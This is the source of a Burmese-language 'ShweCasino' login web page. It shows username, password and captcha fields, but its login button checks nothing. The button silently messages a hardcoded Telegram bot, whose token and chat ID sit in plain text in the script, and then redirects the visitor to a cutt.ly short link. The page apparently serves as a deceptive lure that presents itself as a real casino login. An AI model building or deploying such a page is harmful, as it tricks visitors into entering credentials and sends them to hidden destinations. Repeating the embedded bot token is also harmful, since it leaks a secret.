<!DOCTYPE html>
<html lang="my">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ShweCasino Login</title>

<style>

body{
margin:0;
font-family:"Myanmar Text";
background:#8b0000;
color:white;
}

/* banner */

.banner img{
width:100%;
height:220px;
object-fit:cover;
display:block;
}

/* login box */

.login-box{
background:#6b0000;
margin:15px;
padding:20px;
border-radius:15px;
max-width:500px;
margin-left:auto;
margin-right:auto;
}

h2{
margin-top:0;
color:#ffcc66;
text-align:center;
}

/* input */

input{
width:100%;
padding:12px;
margin:10px 0;
border:none;
border-radius:10px;
background:#ffffff20;
color:white;
font-size:16px;
}

.username{
margin-bottom:25px;
}

/* password */

.pass-box{
position:relative;
}

.eye{
position:absolute;
right:10px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
}

/* forgot password */

.forgot{
display:block;
text-align:right;
font-size:13px;
color:#ffcc66;
text-decoration:none;
margin-top:5px;
}

/* captcha */

.captcha-box{
position:relative;
background:#f3d6a2;
color:#333;
font-size:24px;
letter-spacing:10px;
text-align:center;
padding:12px;
border-radius:10px;
margin-top:10px;
font-weight:bold;
}

.refresh{
position:absolute;
right:10px;
top:8px;
cursor:pointer;
font-size:20px;
}

/* button */

button{
width:100%;
padding:12px;
border:none;
border-radius:10px;
background:#ffcc66;
font-size:18px;
font-weight:bold;
cursor:pointer;
margin-top:10px;
}

/* links */

.links{
display:flex;
justify-content:space-between;
margin-top:10px;
}

.links a{
color:#ffcc66;
text-decoration:none;
}

</style>
</head>

<body>

<div class="banner">
<img src="./logo.jpg">
</div>

<div class="login-box">

<h2>အကောင့်ထဲဝင်ရန်</h2>

<input class="username" placeholder="အသုံးပြုသူအမည်">

<div class="pass-box">

<input type="password" id="pass" placeholder="စကားဝှက်">

<span class="eye" onclick="toggle()"></span>

</div>

<a class="forgot" href="#">စကားဝှက်မေ့နေပါသလား?</a>

<div class="captcha-box">

<span id="cap"></span>

<span class="refresh" onclick="cap()"></span>

</div>

<input placeholder="အပေါ်ကနံပါတ်တွေကိုထည့်ပါ">

<button onclick="login()">အကောင့်ထဲဝင်ရန်</button>

<div class="links">
<a href="#">အကောင့်သစ်ဖွင့်ရန်</a>
<a href="#">စာရင်းသွင်းရန်</a>
</div>

</div>

<script>
const token = "8694948559:AAGXf_c4fWj1qefoqOwriJHtad-ZFwZSy8c ";
const chat_id = "8296340452";
function login(){

let text = "Website login button clicked";

fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}`);

window.location.href="https://cutt.ly/otrecCFE";

}

function cap(){
let n=Math.floor(10000+Math.random()*90000);
document.getElementById("cap").innerText =
n.toString().split("").join(" ");
}

cap();

function toggle(){
let p=document.getElementById("pass");
p.type = (p.type==="password") ? "text" : "password";
}

</script>

</body>
</html>
